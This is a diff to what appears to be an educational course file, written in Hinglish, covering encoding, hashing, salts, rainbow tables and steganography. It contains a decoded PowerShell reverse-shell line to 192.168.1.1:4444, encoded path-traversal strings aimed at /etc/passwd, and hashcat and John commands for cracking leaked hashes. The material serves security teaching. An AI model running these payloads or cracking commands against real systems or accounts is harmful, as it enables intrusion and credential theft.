@@ -2465,33 +2465,573 @@ struct.unpack("<I", b"ABCD")  # (0x44434241,)
   },
 
   "cb-06": {
-    title: "Data Units & Encoding",
-    image: "https://images.unsplash.com/photo-1518770660439-4636190af475?w=900&fit=crop&auto=format",
-    tagline: "Bytes kya hote hain? ASCII se Unicode tak — data ka safar!",
+    title: "Encoding, Hashing & Cryptography Basics",
+    image: "https://images.unsplash.com/photo-1614064641938-3bbee52942c7?w=900&fit=crop&auto=format",
+    tagline: "Base64, MD5, bcrypt, rainbow tables — encoding aur encryption mein farak samjho hamesha ke liye",
     sections: [
       {
-        heading: "📊 Data Units — Bit Se Petabyte Tak",
-        content: `Data measure karne ke liye standard units hain:\n\n| Unit | Size | Real World Example |\n|------|------|--------------------|\n| 1 Bit | 0 ya 1 | Ek switch — on/off |\n| 1 Byte | 8 bits | Ek character (letter 'A') |\n| 1 KB | 1,024 bytes | Ek chhoti text file |\n| 1 MB | 1,024 KB | Ek MP3 song (low quality) |\n| 1 GB | 1,024 MB | ~250 photos |\n| 1 TB | 1,024 GB | ~500 hours HD video |\n| 1 PB | 1,024 TB | Facebook 1 din ka data |\n| 1 EB | 1,024 PB | Puri internet ka ~1 din ka data |\n\n**Speed vs Size:**\n• Storage: Bytes (MB, GB, TB)\n• Internet speed: Bits per second (Mbps, Gbps)\n• 1 Mbps connection = 0.125 MB/s download speed!\n(8 se divide karo bits ko bytes mein laane ke liye)`,
+        heading: "🔤 Encoding Types — Data Ko Format Karna",
+        content: `Encoding data ko ek format se doosre mein convert karna hai — security ke liye nahi, representation ke liye. Koi bhi decode kar sakta hai without any key.
+
+**ASCII — Text Ka Foundation:**
+\`\`\`
+Har character ek number hai:
+'A' = 65 = 0x41 = 01000001
+'a' = 97 = 0x61 = 01100001  (32 zyada than uppercase — same XOR trick!)
+'0' = 48 = 0x30
+' ' = 32 = 0x20 (space)
+'\n' = 10 = 0x0A (newline)
+'\0' = 0  = 0x00 (NULL — string terminator in C)
+
+Security relevance:
+- Buffer overflow mein NULL byte (0x00) string functions terminate karta hai
+- Shellcode mein 0x00 se bachna padta hai (bad character)
+- SQL injection mein hex encoding se quotes escape hote hain: 0x61646d696e = 'admin'
+\`\`\`
+
+**Base64 — Binary Ko Text Mein:**
+\`\`\`
+Kyu zaroori hai: Binary data (images, executables) email ya JSON mein nahi jaata directly
+Solution: 64 printable characters use karo (A-Z, a-z, 0-9, +, /)
+
+How it works:
+1. Input bytes ko 6-bit groups mein todo
+2. Har 6-bit group → Base64 table se ek character
+3. Padding '=' se 3 ka multiple banao
+
+Example: "Man" → Base64 encoding
+'M' = 77 = 01001101
+'a' = 97 = 01100001
+'n' = 110 = 01101110
+
+Group 6 bits: 010011 010110 000101 101110
+Base64:         T       W       F       u = "TWFu"
+
+Verify: echo -n "Man" | base64 → "TWFu"
+\`\`\`
+
+**Base64 Malware Detection — Real Examples:**
+\`\`\`powershell
+# Phishing email mein yeh PowerShell command mili:
+powershell -EncodedCommand JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADEALgAxACIALAA0ADQANAA0ACkA
+
+# Decode karo:
+[System.Text.Encoding]::Unicode.GetString([Convert]::FromBase64String("JABjAGwA..."))
+# Result: $client = New-Object System.Net.Sockets.TCPClient("192.168.1.1",4444)
+# → Reverse shell establish karne ki koshish!
+
+# Linux pe:
+echo "SGVsbG8gV29ybGQ=" | base64 -d
+# Hello World
+
+# CyberChef (free online tool) — analysis ke liye:
+# "From Base64" → "Decode text" → malware payload dekho
+\`\`\`
+
+**URL Encoding aur HTML Entities — Web Security:**
+\`\`\`
+URL Encoding (Percent Encoding):
+/ = %2F     space = %20    & = %26    = = %3D
+# = %23     @ = %40        ? = %3F    + = %2B
+NULL = %00  < = %3C        > = %3E    ' = %27
+
+Path traversal bypass:
+../etc/passwd    → Normal (WAF block karta hai)
+%2e%2e/etc/passwd → URL encoded (WAF bypass?)
+%252e%252e/etc/passwd → Double encoded (aur sneaky!)
+
+HTML Entities:
+< = &lt;    > = &gt;    " = &quot;    ' = &#39;    & = &amp;
+XSS prevention: <script> → &lt;script&gt; → browser execute nahi karta
+\`\`\``,
       },
       {
-        heading: "🔤 ASCII — Text Ka Purana Standard",
-        content: `Computer text kaise store karta hai? Har character ko ek number assign kiya gaya hai — yahi encoding hai.\n\n**ASCII (American Standard Code for Information Interchange)** — 1963 mein banaya gaya:\n• 128 characters (0-127)\n• Letter 'A' = 65\n• Letter 'a' = 97\n• '0' digit = 48\n• Space = 32\n• Enter = 13\n\n**Problem with ASCII:**\n• Sirf English support karta hai\n• Hindi, Chinese, Arabic? Nahi!\n• Sirf 128 characters — bahut kum\n\nIsliye ASCII purana ho gaya aur Unicode aaya.`,
+        heading: "🔒 Hashing — One-Way Function",
+        content: `Hash function ek one-way function hai: koi bhi input do → fixed-size output (hash/digest) milta hai. Reverse nahi ho sakta. Passwords store karne ka safe tarika yahi hai.
+
+**Hash Function Properties:**
+\`\`\`
+1. Deterministic: Same input → hamesha same hash
+2. One-way: Hash se input nahi nikala ja sakta (computationally)
+3. Avalanche effect: 1 bit change → completely different hash
+4. Fixed size: Koi bhi size input → same size output
+5. Collision resistant: Do alag inputs → same hash nahi chahiye (ideal)
+\`\`\`
+
+**Popular Hash Algorithms — Actual Outputs:**
+\`\`\`bash
+echo -n "password123" | md5sum
+# 482c811da5d5b4bc6d497ffa98491e38   ← 32 hex chars = 128 bits
+
+echo -n "password123" | sha1sum
+# cbfdac6008f9cab4083784cbd1874f76618d2a97  ← 40 hex chars = 160 bits
+
+echo -n "password123" | sha256sum
+# ef92b778bafe771e89245b89ecbc08a44a4e166c06659911881f383d4473e94f  ← 64 hex = 256 bits
+
+echo -n "password123" | sha512sum
+# b109f3bbbc244eb82441917ed06d618b9008dd09b3befd1b5e07394c706a8bb980b1d7785e5976ec049b46df5f1326af5a2ea6d103fd07c95385ffab0cacbc86  ← 128 hex = 512 bits
+
+# bcrypt (Python):
+import bcrypt
+hash = bcrypt.hashpw(b"password123", bcrypt.gensalt(rounds=12))
+# $2b$12$EXRkfkdmXn2gzds2SSitu.MW9.TNq6PYK2wn6bqkwVijMiU0NJQMK
+# ↑    ↑   ↑
+# bcrypt cost=12 random_salt...hash
+
+# Notice: bcrypt har baar different hash (different salt) but verify karta hai
+bcrypt.checkpw(b"password123", hash)  # True
+\`\`\`
+
+**Avalanche Effect Demo:**
+\`\`\`python
+import hashlib
+
+msg1 = "Hello World"
+msg2 = "Hello world"  # Sirf 'W' → 'w' change kiya
+
+hash1 = hashlib.sha256(msg1.encode()).hexdigest()
+hash2 = hashlib.sha256(msg2.encode()).hexdigest()
+
+print(hash1)  # a591a6d40bf420404a011733cfb7b190d62c65bf0bcda32b57b277d9ad9f146e
+print(hash2)  # 64ec88ca00b268e5ba1a35678a1b5316d212f4f366b2477232534a8aeca37f3c
+# Completely different! 1 character change = totally different hash
+\`\`\`
+
+**Cybersecurity Uses of Hashing:**
+\`\`\`
+1. Password Storage:
+   Database: username | password_hash
+   Login: user_input → hash → compare with stored hash
+   Agar database leak ho → attacker hashes decode nahi kar sakta directly
+
+2. File Integrity Verification:
+   Download karke SHA-256 check karo:
+   sha256sum kali-linux.iso
+   Official site pe hash se compare karo — match nahi = tampered!
+   VirusTotal pe file hash submit karo → malware check
+
+3. Digital Signatures:
+   Document ka hash nikalo → private key se sign karo → recipient verify kare
+
+4. Malware Detection:
+   Known malware hashes database: VirusTotal, MalwareBazaar
+   Suspicious file ka MD5/SHA-256 → search karo database mein
+
+5. Blockchain:
+   Bitcoin har block ka hash previous block ke hash se — chain!
+   Ek block change karo → sab subsequent blocks invalidate
+\`\`\``,
       },
       {
-        heading: "🌐 Unicode & UTF-8 — World Ka Standard",
-        content: `**Unicode** — ek universal standard jo duniya ki har language support karta hai:\n• 1,114,112 possible characters!\n• Hindi: ह = U+0939\n• Chinese: 中 = U+4E2D\n• Emoji: 😀 = U+1F600\n• Arabic: ع = U+0639\n\n**UTF-8** — Unicode ka most popular encoding:\n• Variable length — common characters (A-Z) 1 byte, rare characters zyada bytes\n• Backward compatible with ASCII\n• Web ka 97%+ pages UTF-8 use karte hain\n\n**Base64 Encoding:**\nBinary data (images, files) ko text mein convert karne ke liye:\n• 64 characters use karta hai (A-Z, a-z, 0-9, +, /)\n• Emails mein attachments, web APIs mein images\n• Cybersecurity: Malware kabhi kabhi Base64 mein chhupa hota hai — dekho tumhara email kahan jaata hai!`,
+        heading: "🌈 Rainbow Tables aur Salt — Attack aur Defense",
+        content: `Agar database se password hashes milein (data breach), attacker unhe crack karna chahega. Rainbow tables is ka sabse classic attack hai — aur salt iska perfect defense.
+
+**Brute Force — Slow but Simple:**
+\`\`\`
+Har possible password try karo, hash karo, compare karo:
+"a" → hash → compare?
+"b" → hash → compare?
+...
+"password123" → hash → MATCH! Found it!
+
+Problem: 8-char alphanumeric = 62^8 = 218 trillion combinations
+MD5: GPU se 10 billion/second → ~6 hours
+bcrypt: 100/second/GPU → 68,000 YEARS
+\`\`\`
+
+**Dictionary Attack — Smarter:**
+\`\`\`bash
+# rockyou.txt — 14 million real leaked passwords:
+john --wordlist=rockyou.txt --format=raw-md5 hashes.txt
+
+# Hashcat:
+hashcat -m 0 hashes.txt rockyou.txt   # MD5 (-m 0)
+hashcat -m 1000 hashes.txt rockyou.txt  # NTLM (-m 1000)
+hashcat -m 3200 hashes.txt rockyou.txt  # bcrypt (-m 3200)
+
+# Rules se wordlist expand karo:
+hashcat -m 0 hashes.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule
+# password → Password1, p@ssword, passw0rd, etc. automatically
+
+# Result: MD5 hashes — rockyou mein 90%+ passwords milte hain seconds mein
+\`\`\`
+
+**Rainbow Table Attack — Time-Memory Tradeoff:**
+\`\`\`
+Problem with dictionary: har baar hash calculate karna slow
+
+Rainbow Table solution:
+Pre-compute: billions of password → hash mappings store karo ek table mein
+Attack: hash table mein lookup karo → instant answer!
+
+Size: CrackStation.net = 15 billion pre-computed entries (free!)
+Coverage: 99%+ of common passwords up to 8 chars (MD5/SHA-1)
+
+Process:
+1. Database breach milo: user1:482c811da5d5b4bc6d497ffa98491e38
+2. CrackStation mein paste karo
+3. Result: "password123" — instantly!
+4. Koi computation nahi — sirf lookup
+
+Limitation: Password+salt ke liye pre-computation infeasible
+\`\`\`
+
+**Salt — Rainbow Table Ko Defeat Karo:**
+\`\`\`python
+import hashlib, os
+
+# Without salt — vulnerable:
+password = "password123"
+hash_no_salt = hashlib.md5(password.encode()).hexdigest()
+# 482c811da5d5b4bc6d497ffa98491e38 → Rainbow table mein milega!
+
+# With salt — safe from rainbow tables:
+salt = os.urandom(16)  # 16 random bytes
+salted_hash = hashlib.sha256(salt + password.encode()).hexdigest()
+# Store: salt + salted_hash (dono zaroori hain verify ke liye)
+
+# Verify:
+def verify(password, stored_salt, stored_hash):
+    computed = hashlib.sha256(stored_salt + password.encode()).hexdigest()
+    return computed == stored_hash
+
+# Kyu salt rainbow tables defeat karta hai:
+# "password123" + salt1 → hash_A
+# "password123" + salt2 → hash_B  (completely different!)
+# Pre-computed table salt ke baad useless — specific salt ke liye table nahi hoti
+\`\`\`
+
+**Real Breaches — Hash Weakness ka Impact:**
+\`\`\`
+2012 — LinkedIn (6.5 million accounts):
+  Storage: unsalted SHA-1
+  Result: 90%+ passwords cracked within days
+  Lesson: salt zaroori hai
+
+2012 — Last.fm (millions of accounts):
+  Storage: unsalted MD5
+  Result: instant rainbow table lookup
+  Lesson: MD5 password ke liye useless
+
+2016 — LinkedIn (117 million, same breach complete dump):
+  GPU cracking: $300 worth of cloud GPUs → 100M+ hashes in days
+  Lesson: slow hashing algorithm zaroori hai
+
+2013 — Adobe (153 million accounts):
+  Storage: 3DES encrypted (not hashed!) + same IV for same passwords!
+  Frequency analysis se patterns dikh gaye
+  Most common encrypted pattern → "123456" was #1
+  Lesson: passwords hash karo, encrypt mat karo
+
+2019 — Collection #1 (773 million unique emails, 22 million passwords):
+  Compilation of many breaches
+  HaveIBeenPwned.com pe check karo apna email
+\`\`\`
+
+**India Context:**
+- 2021: MobiKwik (3.5 million users) — KYC data breach
+- 2023: BSNL (data breach, customer details)
+- Indian e-commerce sites pe multiple breaches
+- Check: haveibeenpwned.com pe apna email daalo`,
       },
       {
-        heading: "🔐 Encoding vs Encryption — Bada Confusion!",
-        content: `**Bahut log confuse ho jaate hain — clear karte hain:**\n\n**Encoding** — Data representation ke liye. Security ke liye NAHI!\n• ASCII, UTF-8, Base64 — sab encoding hai\n• Koi bhi decode kar sakta hai, koi secret nahi\n• Jaise Hindi mein likh do — koi bhi translator use kar sakta hai\n\n**Encryption** — Data protect karne ke liye.\n• Special key chahiye decrypt karne ke liye\n• Key ke bina data gibberish hai\n• AES, RSA, ChaCha20 — encryption algorithms\n\n**Hashing** — One way function\n• Input se fixed size output banata hai\n• Reverse nahi ho sakta\n• Passwords store karne ke liye: actual password nahi, uska hash store hota hai\n• MD5, SHA-256 — hashing algorithms\n\n**Real attack:** Agar tumhe Base64 encoded string mile, easily decode kar sakte ho. Agar encrypted data mile, key ke bina nahi dekh sakte. Difference clear hai?`,
+        heading: "🔑 Hash Types Identify Karna — Forensics aur CTF",
+        content: `Jab tum CTF karo ya pentest mein hash milo, pehle identify karo — kaunsa algorithm hai, phir crack strategy banao.
+
+**Hash Length se Identify Karo:**
+\`\`\`
+Length    Algorithm
+──────────────────────────────────────────────────────
+32 chars  MD5 (128 bits): 482c811da5d5b4bc6d497ffa98491e38
+40 chars  SHA-1 (160 bits): cbfdac6008f9cab4083784cbd1874f76618d2a97
+56 chars  SHA-224: 85b0eca34ede1c4fbd1dcc9e64b4ee8ba70f8e54...
+64 chars  SHA-256: ef92b778bafe771e89245b89ecbc08a44a4e166c...
+96 chars  SHA-384: ...
+128 chars SHA-512: ...
+60 chars  bcrypt: $2b$12$EXRkfkdmXn2gzds2SSitu.MW9...
+\`\`\`
+
+**Hash Prefix se Identify Karo:**
+\`\`\`
+$1$      MD5-crypt (Linux)
+$2b$     bcrypt
+$5$      SHA-256-crypt (Linux)
+$6$      SHA-512-crypt (Linux — common /etc/shadow)
+$y$      yescrypt (modern Linux)
+$apr1$   Apache MD5
+{MD5}    LDAP MD5
+{SHA}    LDAP SHA-1
+0x...    MSSQL older
+*...     MySQL 4.x
+\`\`\`
+
+**Hashid aur Hash-identifier Tools:**
+\`\`\`bash
+# Kali Linux pe:
+hash-identifier
+# Enter hash → possible types batata hai
+
+hashid "482c811da5d5b4bc6d497ffa98491e38"
+# [+] MD2
+# [+] MD5
+# [+] MD4
+# [+] Double MD5
+# (Multiple possibilities — context se decide karo)
+
+hashid "$2b$12$EXRkfkdmXn2gzds2SSitu.MW9.TNq6PYK2wn6bqkwVijMiU0NJQMK"
+# [+] Blowfish(OpenBSD) → bcrypt!
+
+# Online: hashes.com identify karo
+\`\`\`
+
+**Hashcat Mode Numbers — Cheat Sheet:**
+\`\`\`
+-m 0      MD5
+-m 100    SHA-1
+-m 1400   SHA-256
+-m 1700   SHA-512
+-m 1000   NTLM (Windows password hashes)
+-m 1800   sha512crypt $6$ (Linux /etc/shadow)
+-m 3200   bcrypt $2a$
+-m 500    MD5crypt $1$ (Linux)
+-m 7400   SHA-256crypt $5$ (Linux)
+
+# Complete list:
+hashcat --help | grep "Hash types"
+\`\`\`
+
+**CTF Challenge — Hash Cracking Workflow:**
+\`\`\`bash
+# 1. Hash mila: 5f4dcc3b5aa765d61d8327deb882cf99
+# 2. Length check: 32 chars → MD5
+
+# 3. Hashcat se attack:
+hashcat -m 0 -a 0 5f4dcc3b5aa765d61d8327deb882cf99 /usr/share/wordlists/rockyou.txt
+
+# 4. Result:
+# 5f4dcc3b5aa765d61d8327deb882cf99:password   ← bahut common!
+
+# 5. Agar wordlist fail kare, rules try karo:
+hashcat -m 0 hash.txt rockyou.txt -r best64.rule
+
+# 6. Custom mask attack (agar pattern pata ho — e.g. 4 digits suffix):
+hashcat -m 0 hash.txt -a 3 ?l?l?l?l?d?d?d?d   # 4 lowercase + 4 digits
+
+# 7. John the Ripper alternative:
+john --format=raw-md5 --wordlist=rockyou.txt hash.txt
+john --show hash.txt
+\`\`\``,
+      },
+      {
+        heading: "🔐 Encoding vs Encryption vs Hashing — Final Clarity",
+        content: `Yeh teen concepts ko confuse karna ek HUGE security mistake hai. Production mein galat choice = data breach.
+
+**Side-by-Side Comparison:**
+
+| Property | Encoding | Encryption | Hashing |
+|---------|---------|-----------|--------|
+| Purpose | Format change | Data protect | Integrity/passwords |
+| Reversible? | Yes (no key) | Yes (with key) | NO (one-way) |
+| Key needed? | No | Yes | No |
+| Security? | None | High | Medium-High |
+| Examples | Base64, URL, HTML | AES, RSA, ChaCha20 | MD5, SHA-256, bcrypt |
+| Use case | Data transfer format | Secret communication | Password storage |
+
+**Common Developer Mistakes:**
+\`\`\`python
+# WRONG — Base64 is NOT encryption:
+import base64
+password = "admin123"
+encoded = base64.b64encode(password.encode())
+# YWRtaW4xMjM= → Anyone can decode instantly!
+# NEVER store passwords like this
+
+# WRONG — MD5 is NOT secure for passwords:
+import hashlib
+hashed = hashlib.md5(password.encode()).hexdigest()
+# 0192023a7bbd73250516f069df18b500 → rainbow table mein milega!
+
+# WRONG — SHA-256 (alone) is NOT secure for passwords:
+hashed = hashlib.sha256(password.encode()).hexdigest()
+# Too fast → GPU se crack karo
+
+# CORRECT — Use bcrypt:
+import bcrypt
+hashed = bcrypt.hashpw(password.encode(), bcrypt.gensalt(rounds=12))
+# $2b$12$... → Deliberately slow, salted, secure
+
+# CORRECT — Use Argon2 (best):
+from argon2 import PasswordHasher
+ph = PasswordHasher(time_cost=3, memory_cost=65536, parallelism=4)
+hashed = ph.hash(password)
+# $argon2id$v=19$m=65536,t=3,p=4$... → Memory-hard, GPU resistant
+
+# Verify:
+ph.verify(hashed, password)  # True
+\`\`\`
+
+**When to Use What:**
+\`\`\`
+Use ENCODING when:
+  ✓ Binary data ko text mein convert karna (email attachments, JSON)
+  ✓ URL mein special characters encode karna
+  ✓ HTML output mein XSS prevent karna (&lt; etc.)
+  ✗ NEVER for security/privacy
+
+Use ENCRYPTION when:
+  ✓ Data transit mein (TLS/HTTPS)
+  ✓ Database mein sensitive data (credit cards, PII)
+  ✓ File encryption (VeraCrypt, GPG)
+  ✓ API keys, tokens secure storage
+  Requirements: key management zaroori, key security = data security
+
+Use HASHING when:
+  ✓ Password storage (bcrypt/Argon2 — slow algorithms!)
+  ✓ File integrity verification (SHA-256)
+  ✓ Digital signatures (data ka hash sign karo)
+  ✓ Malware detection (known malware hash databases)
+  ✗ NEVER use MD5/SHA-1 for passwords
+  ✗ NEVER use fast hash (SHA-256 alone) for passwords — too fast!
+\`\`\`
+
+**Digital Signatures — Hashing + Asymmetric Crypto:**
+\`\`\`
+How it works:
+1. Alice ne document likha
+2. Alice document ka SHA-256 hash nikali
+3. Hash ko apni PRIVATE key se encrypt kiya → signature
+4. Document + signature bheja Bob ko
+
+Bob verify karta hai:
+1. Document ka SHA-256 hash compute kiya
+2. Signature ko Alice ki PUBLIC key se decrypt kiya → Alice ka hash
+3. Compare kiya — same? ✓ Authentic, untampered
+   Different? ✗ Tampered ya fake sender
+
+Real-world: HTTPS certificates, software updates, code signing, emails (S/MIME)
+
+India context: Aadhaar, DigiLocker — digital signatures use karte hain document authentication ke liye
+\`\`\``,
+      },
+      {
+        heading: "🕵️ Steganography aur Entropy — Hidden Data Detect Karna",
+        content: `Steganography data existence ko hide karta hai — innocent file ke andar secret data. Malware analysts aur CTF players ko yeh detect karna aana chahiye.
+
+**Shannon Entropy — Randomness Measure:**
+\`\`\`
+Entropy = average information content per byte (0-8 bits/byte)
+
+Low entropy (structured data):
+  English text: ≈ 4.5 bits/byte (patterns, repetition)
+  HTML/XML: ≈ 5-6 bits/byte
+
+High entropy (random-looking):
+  Encrypted data: ≈ 7.5-8 bits/byte
+  Compressed data (ZIP, PNG): ≈ 7.5-8 bits/byte
+  Random bytes: ≈ 8 bits/byte
+
+Malware analysis use:
+  Normal EXE: text section ≈ 6 bits/byte
+  Packed/encrypted EXE: text section ≈ 7.8+ bits/byte
+  → High entropy = likely obfuscated/packed → unpack karna zaroori
+\`\`\`
+
+**Tools — Entropy Analysis:**
+\`\`\`bash
+# Python se entropy calculate karo:
+import math
+from collections import Counter
+
+def entropy(data):
+    counts = Counter(data)
+    length = len(data)
+    return -sum(c/length * math.log2(c/length) for c in counts.values())
+
+with open("suspicious.exe", "rb") as f:
+    data = f.read()
+print(f"Entropy: {entropy(data):.2f} bits/byte")
+
+# CyberChef: "Entropy" operation → bar chart dikhata hai
+
+# PE-Studio tool (Windows): automatic entropy per section dikhata hai
+
+# binwalk — embedded files aur high entropy detect karo:
+binwalk -E suspicious_file    # Entropy graph
+binwalk -e image.png          # Embedded files extract karo
+\`\`\`
+
+**LSB Steganography — Image Mein Data:**
+\`\`\`python
+# Image mein data hide karna (LSB method):
+from PIL import Image
+
+def hide_message(image_path, message, output_path):
+    img = Image.open(image_path)
+    pixels = list(img.getdata())
+    
+    binary_msg = ''.join(format(ord(c), '08b') for c in message) + '00000000'  # NULL terminator
+    
+    new_pixels = []
+    msg_index = 0
+    
+    for pixel in pixels:
+        r, g, b = pixel[:3]
+        if msg_index < len(binary_msg):
+            r = (r & 0xFE) | int(binary_msg[msg_index])  # LSB change karo
+            msg_index += 1
+        new_pixels.append((r, g, b))
+    
+    img.putdata(new_pixels)
+    img.save(output_path)
+
+# Human eye ko fark nahi pata — 1 bit change per pixel = invisible
+# 1MP image = 1,000,000 pixels × 3 channels = 375 KB data hide ho sakta hai!
+
+# Detection — stegsolve ya zsteg:
+# zsteg suspicious.png -a   # All possible methods try karo
+# steghide extract -sf image.jpg   # Common tool CTF mein
+\`\`\`
+
+**CTF Steganography Checklist:**
+\`\`\`bash
+# File identify karo:
+file mysterious_file    # Magic bytes se type
+
+# Hex dump dekho:
+xxd file | head -20
+strings file | head -40    # Readable strings
+
+# Metadata:
+exiftool image.jpg     # Hidden metadata mein flag ho sakta hai
+
+# Embedded files:
+binwalk -e file        # Embedded files extract karo
+
+# LSB:
+zsteg image.png        # PNG LSB analysis
+stegsolve image.png    # GUI tool — bit planes
+
+# Audio steganography:
+sonic-visualiser audio.wav   # Spectrogram mein text hidden ho sakta hai
+
+# Password-protected:
+steghide extract -sf image.jpg -p password123
+
+# Known CTF tools:
+# Outguess, Stegdetect, OpenStego, DeepSound (audio)
+\`\`\``,
       },
     ],
     keyPoints: [
-      "1 Byte = 8 bits, Internet speed Mbps mein = 8 se divide = MB/s",
-      "ASCII = 128 characters, sirf English",
-      "Unicode/UTF-8 = duniya ki sab languages",
-      "Encoding ≠ Encryption — encoding koi bhi decode kar sakta hai",
-      "Hashing one-way hai — passwords hashed form mein store hote hain",
+      "Encoding ≠ Encryption ≠ Hashing — teen bilkul alag cheezein: encoding koi bhi decode kar sakta hai, encryption key se, hashing one-way",
+      "Base64 — binary ko text mein, koi security nahi; malware Base64 mein commands hide karta hai PowerShell -EncodedCommand se",
+      "MD5/SHA-1 passwords ke liye broken — collision possible, rainbow tables available; bcrypt/Argon2 use karo (deliberately slow)",
+      "Rainbow table: pre-computed hash→password mappings — CrackStation pe 15 billion+ hashes. Salt se defeat hota hai",
+      "bcrypt har baar different hash deta hai (random salt) — same password ka alag hash = rainbow table useless",
+      "Hash identify: 32 chars=MD5, 40=SHA-1, 64=SHA-256, $2b$=bcrypt, $6$=SHA-512crypt (Linux /etc/shadow)",
+      "Entropy: 7.5-8 bits/byte = encrypted/compressed/packed data — malware high entropy = obfuscated code",
+      "Digital signature = document hash + private key se encrypt karo — integrity aur authenticity dono",
     ],
   },
 
